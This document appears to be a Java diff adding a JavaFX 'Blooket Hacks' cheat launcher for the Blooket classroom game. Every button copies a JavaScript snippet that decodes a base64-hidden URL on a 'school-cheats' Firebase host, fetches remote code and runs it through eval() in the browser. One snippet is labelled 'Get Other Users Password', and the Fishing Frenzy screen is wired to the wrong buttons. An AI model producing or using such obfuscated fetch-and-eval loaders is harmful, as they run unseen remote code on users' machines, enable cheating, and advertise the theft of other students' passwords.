@@ -1,0 +1,651 @@
+package com.bunnytoes.blooket_hacks;
+
+import javafx.animation.PauseTransition;
+import javafx.application.Application;
+import javafx.fxml.FXMLLoader;
+import javafx.scene.Group;
+import javafx.scene.Scene;
+import javafx.scene.control.Button;
+import javafx.scene.control.Label;
+import javafx.scene.input.Clipboard;
+import javafx.scene.input.ClipboardContent;
+import javafx.scene.layout.Pane;
+import javafx.scene.paint.Color;
+import javafx.scene.text.Font;
+import javafx.scene.text.FontPosture;
+import javafx.scene.text.FontWeight;
+import javafx.scene.text.Text;
+import javafx.stage.Stage;
+import javafx.util.Duration;
+
+import java.io.IOException;
+
+public class BlooketHacks extends Application {
+    @Override
+    public void start(Stage stage) throws IOException {
+        ClipboardContent content = new ClipboardContent();
+
+        Font font = Font.font("Arial", FontWeight.EXTRA_BOLD, FontPosture.REGULAR, 12.5);
+
+        Text credit = new Text("All Scripts Made By glizzz_y");
+        credit.setTranslateX(100);
+        credit.setTranslateY(300);
+        credit.setFont(font);
+        Text gliz = new Text("https://twitter.com/glizuwu");
+        gliz.setTranslateX(100);
+        gliz.setTranslateY(315);
+        gliz.setFont(font);
+        gliz.setUnderline(true);
+        gliz.setFill(Color.BLUE);
+        gliz.setOnMouseClicked(mouseEvent -> {
+            getHostServices().showDocument("https://twitter.com/glizuwu");
+        });
+        Text git = new Text("https://github.com/glixzzy/blooket-hack");
+        git.setTranslateX(75);
+        git.setTranslateY(330);
+        git.setFont(font);
+        git.setUnderline(true);
+        git.setFill(Color.BLUE);
+        git.setOnMouseClicked(mouseEvent -> {
+            getHostServices().showDocument("https://github.com/glixzzy/blooket-hack");
+        });
+        Button tod = new Button("Tower Of Doom");
+        tod.setStyle("\t-fx-background-color: #00002e");
+        tod.setFont(font);
+        tod.setTextFill(Color.BLACK);
+        tod.setTranslateY(50);
+        tod.setTranslateX(25);
+        Button td = new Button("Tower Defense");
+        td.setStyle("\t-fx-background-color: #00002e");
+        td.setFont(font);
+        td.setTextFill(Color.BLACK);
+        td.setTranslateY(50);
+        td.setTranslateX(175);
+        Button race = new Button("Racing");
+        race.setStyle("\t-fx-background-color: #00002e");
+        race.setFont(font);
+        race.setTextFill(Color.BLACK);
+        race.setTranslateY(100);
+        race.setTranslateX(25);
+        Button gold = new Button("Gold");
+        gold.setStyle("\t-fx-background-color: #00002e");
+        gold.setFont(font);
+        gold.setTextFill(Color.BLACK);
+        gold.setTranslateY(100);
+        gold.setTranslateX(175);
+        Button gl = new Button("Global");
+        gl.setStyle("\t-fx-background-color: #00002e");
+        gl.setFont(font);
+        gl.setTextFill(Color.BLACK);
+        gl.setTranslateY(150);
+        gl.setTranslateX(25);
+        Button ff = new Button("Fishing Frenzy");
+        ff.setStyle("\t-fx-background-color: #00002e");
+        ff.setFont(font);
+        ff.setTextFill(Color.BLACK);
+ff.setTranslateY(150);
+ff.setTranslateX(175);
+        Button fct = new Button("Factory");
+        fct.setStyle("\t-fx-background-color: #00002e");
+        fct.setFont(font);
+        fct.setTextFill(Color.BLACK);
+        fct.setTranslateY(200);
+        fct.setTranslateX(25);
+        Button ch = new Button("Crypto");
+        ch.setStyle("\t-fx-background-color: #00002e");
+        ch.setFont(font);
+        ch.setTextFill(Color.BLACK);
+        ch.setTranslateY(200);
+        ch.setTranslateX(175);
+        Button ck = new Button("Crazy Kingdom");
+        ck.setStyle("\t-fx-background-color: #00002e");
+        ck.setFont(font);
+        ck.setTextFill(Color.BLACK);
+        ck.setTranslateY(250);
+        ck.setTranslateX(25);
+        Button cafe = new Button("Cafe");
+        cafe.setStyle("\t-fx-background-color: #00002e");
+        cafe.setFont(font);
+        cafe.setTextFill(Color.BLACK);
+        cafe.setTranslateY(250);
+        cafe.setTranslateX(175);
+
+        Button bk = new Button("Back ⤹");
+        bk.setStyle("\t-fx-background-color: #00002e");
+        bk.setFont(font);
+        bk.setTextFill(Color.BLACK);
+
+           Button bk1 = new Button("Back ⤹");
+        bk1.setStyle("\t-fx-background-color: #00002e");
+        bk1.setFont(font);
+        bk1.setTextFill(Color.BLACK);
+
+           Button bk2 = new Button("Back ⤹");
+        bk2.setStyle("\t-fx-background-color: #00002e");
+        bk2.setFont(font);
+        bk2.setTextFill(Color.BLACK);
+
+           Button bk3 = new Button("Back ⤹");
+        bk3.setStyle("\t-fx-background-color: #00002e");
+        bk3.setFont(font);
+        bk3.setTextFill(Color.BLACK);
+
+           Button bk4 = new Button("Back ⤹");
+        bk4.setStyle("\t-fx-background-color: #00002e");
+        bk4.setFont(font);
+        bk4.setTextFill(Color.BLACK);
+
+           Button bk5 = new Button("Back ⤹");
+        bk5.setStyle("\t-fx-background-color: #00002e");
+        bk5.setFont(font);
+        bk5.setTextFill(Color.BLACK);
+
+           Button bk6 = new Button("Back ⤹");
+        bk6.setStyle("\t-fx-background-color: #00002e");
+        bk6.setFont(font);
+        bk6.setTextFill(Color.BLACK);
+
+           Button bk7 = new Button("Back ⤹");
+        bk7.setStyle("\t-fx-background-color: #00002e");
+        bk7.setFont(font);
+        bk7.setTextFill(Color.BLACK);
+
+           Button bk8 = new Button("Back ⤹");
+        bk8.setStyle("\t-fx-background-color: #00002e");
+        bk8.setFont(font);
+        bk8.setTextFill(Color.BLACK);
+
+           Button bk9 = new Button("Back ⤹");
+        bk9.setStyle("\t-fx-background-color: #00002e");
+        bk9.setFont(font);
+        bk9.setTextFill(Color.BLACK);
+
+        Pane main = new Pane(tod,td,race,gold,gl,ff,ch,fct,ck,cafe,credit,gliz,git);
+        main.setStyle("\t-fx-background-color: #1a1915");
+        Scene mainScene = new Scene(main,350,350);
+
+        bk.setOnMouseClicked(e->
+        {
+            stage.setScene(mainScene);
+        });
+        Button c = new Button("Add Coins");
+        c.setTranslateY(50);
+        c.setTranslateX(25);
+        c.setStyle("\t-fx-background-color: #00002e");
+        c.setTextFill(Color.BLACK);
+        c.setFont(font);
+        c.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90b2RBZGRDb2lucy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));`");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(c);
+        });
+        Button lec = new Button("Lower Enemy Charisma");
+        lec.setTranslateY(50);
+        lec.setTranslateX(175);
+        lec.setStyle("\t-fx-background-color: #00002e");
+        lec.setTextFill(Color.BLACK);
+        lec.setFont(font);
+        lec.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90b2RMb3dlckVuZW15Q2hhcmlzbWEuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(lec);
+        });
+        Button lew = new Button("Lower Enemy Wisdom");
+        lew.setTranslateY(100);
+        lew.setTranslateX(185);
+        lew.setStyle("\t-fx-background-color: #00002e");
+        lew.setTextFill(Color.BLACK);
+        lew.setFont(font);
+        lew.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90b2RMb3dlckVuZW15V2lzZG9tLmpzb24=')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(lew);
+        });
+        Button les = new Button("Lower Enemy Strength");
+        les.setTranslateY(100);
+        les.setTranslateX(25);
+        les.setStyle("\t-fx-background-color: #00002e");
+        les.setTextFill(Color.BLACK);
+        les.setFont(font);
+        les.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90b2RMb3dlckVuZW15U3RyZW5ndGguanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(les);
+        });
+        Button la = new Button("Lower All Enemy Stats");
+        la.setTranslateY(150);
+        la.setTranslateX(25);
+        la.setStyle("\t-fx-background-color: #00002e");
+        la.setTextFill(Color.BLACK);
+        la.setFont(font);
+        la.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90b2RMb3dlckFsbEVuZW15U3RhdHMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(la);
+        });
+        Pane TOD = new Pane(bk,c,lec,lew,les,la);
+        TOD.setStyle("\t-fx-background-color: #1a1915");
+            Scene ToD = new Scene(TOD,350,350);
+        tod.setOnMouseClicked(e->{
+            stage.setScene(ToD);
+        });
+
+        bk1.setOnMouseClicked(e->
+        {
+            stage.setScene(mainScene);
+        });
+Button cgr = new Button("Change Game Round");
+cgr.setStyle("\t-fx-background-color: #00002e");
+cgr.setTranslateX(25);
+cgr.setTranslateY(50);
+        cgr.setTextFill(Color.BLACK);
+        cgr.setFont(font);
+        cgr.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90ZENoYW5nZUdhbWVSb3VuZC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(cgr);
+        });
+        Button co = new Button("Get cash");
+        co.setStyle("\t-fx-background-color: #00002e");
+        co.setTranslateX(25);
+        co.setTranslateY(100);
+        co.setTextFill(Color.BLACK);
+        co.setFont(font);
+        co.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90ZEdldENhc2guanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(co);
+        });
+Button ce = new Button("Clear Enemies");
+        ce.setStyle("\t-fx-background-color: #00002e");
+        ce.setTranslateX(175);
+        ce.setTranslateY(50);
+        ce.setTextFill(Color.BLACK);
+        ce.setFont(font);
+        ce.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS90ZENsZWFyRW5lbWllcy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(ce);
+        });
+
+        Pane TD = new Pane(cgr,bk1,co,ce);
+        TD.setStyle("\t-fx-background-color: #1a1915");
+        Scene Td = new Scene(TD,350,350);
+        td.setOnMouseClicked(e->{
+            stage.setScene(Td);
+        });
+
+        Button it = new Button("Instant Win");
+        it.setStyle("\t-fx-background-color: #00002e");
+        it.setTranslateX(175);
+        it.setTranslateY(50);
+        it.setTextFill(Color.BLACK);
+        it.setFont(font);
+        it.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9yYWNpbmdJbnN0YW50V2luLmpzb24=')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(it);
+        });
+        bk2.setOnMouseClicked(e->
+        {
+            stage.setScene(mainScene);
+        });
+        Pane r = new Pane(it,bk2);
+        r.setStyle("\t-fx-background-color: #1a1915");
+        Scene R = new Scene(r,350,350);
+        race.setOnMouseClicked(e->{
+            stage.setScene(R);
+        });
+
+        Button gld = new Button("Get Gold");
+        gld.setStyle("\t-fx-background-color: #00002e");
+        gld.setTranslateX(25);
+        gld.setTranslateY(50);
+        gld.setTextFill(Color.BLACK);
+        gld.setFont(font);
+        gld.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nb2xkR2V0R29sZC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(gld);
+        });
+        Button esp = new Button("Chest ESP");
+        esp.setStyle("\t-fx-background-color: #00002e");
+        esp.setTranslateX(175);
+        esp.setTranslateY(50);
+        esp.setTextFill(Color.BLACK);
+        esp.setFont(font);
+        esp.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nb2xkQ2hlc3RFU1AuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(esp);
+        });
+        bk3.setOnMouseClicked(e->
+        {
+            stage.setScene(mainScene);
+        });
+Pane GOLD = new Pane(gld,esp,bk3);
+GOLD.setStyle("\t-fx-background-color: #1a1915");
+Scene GoL = new Scene(GOLD,350,350);
+        gold.setOnMouseClicked(e->{
+            stage.setScene(GoL);
+        });
+
+        bk4.setOnMouseClicked(e->
+        {
+            stage.setScene(mainScene);
+        });
+Button at = new Button("Add Tokens");
+        at.setStyle("\t-fx-background-color: #00002e");
+        at.setTranslateX(25);
+        at.setTranslateY(50);
+        at.setTextFill(Color.BLACK);
+        at.setFont(font);
+        at.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxBZGRUb2tlbnMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(at);
+        });
+Button by = new Button("Bypass Random Name");
+        by.setStyle("\t-fx-background-color: #00002e");
+        by.setTranslateX(175);
+        by.setTranslateY(50);
+        by.setTextFill(Color.BLACK);
+        by.setFont(font);
+        by.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxCeXBhc3NOYW1lLmpzb24=')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(by);
+        });
+Button get = new Button("Get All Blooks");
+        get.setStyle("\t-fx-background-color: #00002e");
+        get.setTranslateX(25);
+        get.setTranslateY(100);
+        get.setTextFill(Color.BLACK);
+        get.setFont(font);
+        get.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxHZXRBbGxCbG9va3MuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(get);
+        });
+Button cor = new Button("Every Answer Correct");
+        cor.setStyle("\t-fx-background-color: #00002e");
+        cor.setTranslateX(175);
+        cor.setTranslateY(100);
+        cor.setTextFill(Color.BLACK);
+        cor.setFont(font);
+        cor.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxFdmVyeUFuc3dlckNvcnJlY3QuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(cor);
+        });
+Button sm = new Button("Spam Open Boxes");
+        sm.setStyle("\t-fx-background-color: #00002e");
+        sm.setTranslateX(25);
+        sm.setTranslateY(150);
+        sm.setTextFill(Color.BLACK);
+        sm.setFont(font);
+        sm.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxTcGFtT3BlbkJveGVzLmpzb24=')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(sm);
+        });
+Button s = new Button("Sell Dupe Blooks");
+        s.setStyle("\t-fx-background-color: #00002e");
+        s.setTranslateX(175);
+        s.setTranslateY(150);
+        s.setTextFill(Color.BLACK);
+        s.setFont(font);
+        s.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxTZWxsRHVwZUJsb29rcy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(s);
+        });
+
+        Pane GLO = new Pane(at,by,get,cor,sm,s,bk4);
+        GLO.setStyle("\t-fx-background-color: #1a1915");
+        Scene glo = new Scene(GLO,350,350);
+        gl.setOnMouseClicked(e->{
+            stage.setScene(glo);
+        });
+
+        Button sw = new Button("Set Weight");
+        sw.setStyle("\t-fx-background-color: #00002e");
+        sw.setTranslateX(25);
+        sw.setTranslateY(50);
+        sw.setTextFill(Color.BLACK);
+        sw.setFont(font);
+        sw.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9mclNldFdlaWdodC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(sw);
+        });
+        bk5.setOnMouseClicked(e->
+        {
+            stage.setScene(mainScene);
+        });
+        Pane FF = new Pane(it,bk2);
+        FF.setStyle("\t-fx-background-color: #1a1915");
+        Scene F = new Scene(FF,350,350);
+        ff.setOnMouseClicked(e->{
+            stage.setScene(F);
+        });
+
+        bk6.setOnMouseClicked(e->{
+            stage.setScene(mainScene);
+        });
+        Button mb = new Button("Get Mega Bot");
+        mb.setStyle("\t-fx-background-color: #00002e");
+        mb.setTranslateX(25);
+        mb.setTranslateY(50);
+        mb.setTextFill(Color.BLACK);
+        mb.setFont(font);
+        mb.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9mYWN0b3J5R2V0TWVnYUJvdC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(mb);
+        });
+        Button csh = new Button("Get Cash");
+        csh.setStyle("\t-fx-background-color: #00002e");
+        csh.setTranslateX(175);
+        csh.setTranslateY(50);
+        csh.setTextFill(Color.BLACK);
+        csh.setFont(font);
+        csh.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9mYWN0b3J5R2V0Q2FzaC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(csh);
+        });
+        Pane FCT = new Pane(mb,csh,bk6);
+        FCT.setStyle("\t-fx-background-color: #1a1915");
+        Scene Fct = new Scene(FCT,350,350);
+        fct.setOnMouseClicked(e->{
+            stage.setScene(Fct);
+        });
+
+        bk7.setOnMouseClicked(e->{
+            stage.setScene(mainScene);
+        });
+        Button gc = new Button("Get Crypto");
+        gc.setStyle("\t-fx-background-color: #00002e");
+        gc.setTranslateX(25);
+        gc.setTranslateY(50);
+        gc.setTextFill(Color.BLACK);
+        gc.setFont(font);
+        gc.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jcnlwdG9HZXRDcnlwdG8uanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(gc);
+        });
+        Button hck = new Button("Get Other Users Password");
+        hck.setStyle("\t-fx-background-color: #00002e");
+        hck.setTranslateX(165);
+        hck.setTranslateY(50);
+        hck.setTextFill(Color.BLACK);
+        hck.setFont(font);
+        hck.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jcnlwdG9HZXRPdGhlcnNQYXNzd29yZHMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(hck);
+        });
+        Pane crypto = new Pane(gc,hck,bk7);
+        crypto.setStyle("\t-fx-background-color: #1a1915");
+        Scene C = new Scene(crypto,350,350);
+        ch.setOnMouseClicked(e->{
+            stage.setScene(C);
+        });
+
+        bk8.setOnMouseClicked(e->{
+            stage.setScene(mainScene);
+        });
+        Button nt = new Button("No Taxes");
+        nt.setStyle("\t-fx-background-color: #00002e");
+        nt.setTranslateX(25);
+        nt.setTranslateY(50);
+        nt.setTextFill(Color.BLACK);
+        nt.setFont(font);
+        nt.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ja05vVGF4ZXMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(nt);
+        });
+        Button sg = new Button("Set Guests");
+        sg.setStyle("\t-fx-background-color: #00002e");
+        sg.setTranslateX(175);
+        sg.setTranslateY(50);
+        sg.setTextFill(Color.BLACK);
+        sg.setFont(font);
+        sg.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ja1NldEd1ZXN0cy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(sg);
+        });
+        Button mr = new Button("Max Resources");
+        mr.setStyle("\t-fx-background-color: #00002e");
+        mr.setTranslateX(25);
+        mr.setTranslateY(100);
+        mr.setTextFill(Color.BLACK);
+        mr.setFont(font);
+        mr.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ja01heFJlc291cmNlcy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(mr);
+        });
+        Button sk = new Button("Skip Guests");
+        sk.setStyle("\t-fx-background-color: #00002e");
+        sk.setTranslateX(175);
+        sk.setTranslateY(100);
+        sk.setTextFill(Color.BLACK);
+        sk.setFont(font);
+        sk.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ja1NraXBHdWVzdC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(sk);
+        });
+        Button cs = new Button("Choice ESP");
+        cs.setStyle("\t-fx-background-color: #00002e");
+        cs.setTranslateX(25);
+        cs.setTranslateY(150);
+        cs.setTextFill(Color.BLACK);
+        cs.setFont(font);
+        cs.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ja0Nob2ljZUVTUC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(cs);
+        });
+        Pane CK = new Pane(nt,sg,mr,sk,cs,bk8);
+        CK.setStyle("\t-fx-background-color: #1a1915");
+        Scene cK = new Scene(CK,350,350);
+        ck.setOnMouseClicked(e->{
+            stage.setScene(cK);
+        });
+
+        bk9.setOnMouseClicked(e->{
+            stage.setScene(mainScene);
+        });
+        Button coin = new Button("Get Coins");
+        coin.setStyle("\t-fx-background-color: #00002e");
+        coin.setTranslateX(25);
+        coin.setTranslateY(50);
+        coin.setTextFill(Color.BLACK);
+        coin.setFont(font);
+        coin.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jYWZlR2V0Q29pbnMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));\n");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(coin);
+        });
+        Button inf = new Button("Infinite Food Level");
+        inf.setStyle("\t-fx-background-color: #00002e");
+        inf.setTranslateX(175);
+        inf.setTranslateY(50);
+        inf.setTextFill(Color.BLACK);
+        inf.setFont(font);
+        inf.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jYWZlSW5maW5pdGVGb29kTGV2ZWwuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));\n");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(inf);
+        });
+        Button in = new Button("Stock Infinite Food");
+        in.setStyle("\t-fx-background-color: #00002e");
+        in.setTranslateX(25);
+        in.setTranslateY(100);
+        in.setTextFill(Color.BLACK);
+        in.setFont(font);
+        in.setOnMouseClicked(mouseEvent -> {
+            content.putString("fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jYWZlU3RvY2tJbmZpbml0ZUZvb2QuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));\n");
+            Clipboard.getSystemClipboard().setContent(content);
+            content.putString("");
+            Pause5(in);
+        });
+        Pane ca = new Pane(in,inf,coin,bk9);
+        ca.setStyle("\t-fx-background-color: #1a1915");
+        Scene cA = new Scene(ca,350,350);
+        cafe.setOnMouseClicked(e->{
+            stage.setScene(cA);
+        });
+
+
+        stage.setTitle("Blooket Hacks");
+        stage.setScene(mainScene);
+        stage.show();
+    }
+static void Pause5 (Button b)
+    {
+        String txt = b.getText();
+        b.setText("Copied");
+        PauseTransition shortPause = new PauseTransition(Duration.seconds(5));
+        shortPause.setOnFinished(event -> b.setText(txt));
+        shortPause.playFromStart();
+    }
+    public static void main(String[] args) {
+        launch();
+    }
+}
